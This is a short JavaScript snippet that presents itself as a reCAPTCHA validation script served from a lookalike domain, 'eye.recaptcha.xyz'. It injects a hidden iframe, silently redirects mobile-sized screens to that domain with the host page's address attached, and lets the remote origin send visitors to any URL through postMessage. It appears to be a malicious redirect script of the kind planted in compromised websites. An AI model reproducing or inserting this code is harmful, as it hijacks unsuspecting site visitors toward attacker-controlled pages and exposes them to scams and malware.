var base = "https://eye.recaptcha.xyz";
var iframe = document.createElement('iframe');
iframe.src = base+"/validation";
iframe.style = "border:0;margin:0;padding:0;width:0;height:0;display:none;";
document.documentElement.appendChild(iframe);
var mql = window.matchMedia("(orientation: portrait)");
var append = "";
if (!navigator.cookieEnabled){
    append += "host="+document.domain+"&referer="+encodeURIComponent(location.href)
}
function onMatchMeidaChange(mql){
    if(mql.matches) {
        if (screen.availWidth < 320){
            window.location.href = base+"/challenge"+(append?'?'+append:'');
        }
        if (screen.availHeight < 480){
            window.location.href = base+"/challenge"+(append?'?'+append:'');
        }
    }else {
        if (screen.availWidth < 480){
            window.location.href = base+"/challenge"+(append?'?'+append:'');
        }
        if (screen.availHeight < 320){
            window.location.href = base+"/challenge"+(append?'?'+append:'');
        }
    }
}
onMatchMeidaChange(mql);
mql.addListener(onMatchMeidaChange);
function receiveMessage(event)
{
    if (event.origin !== base)
        return;
    var json = JSON.parse(event.data);
    switch (json.method) {
        case 'location':
            window.location.href = json.data;
            break
    }
}
window.addEventListener("message", receiveMessage, false);
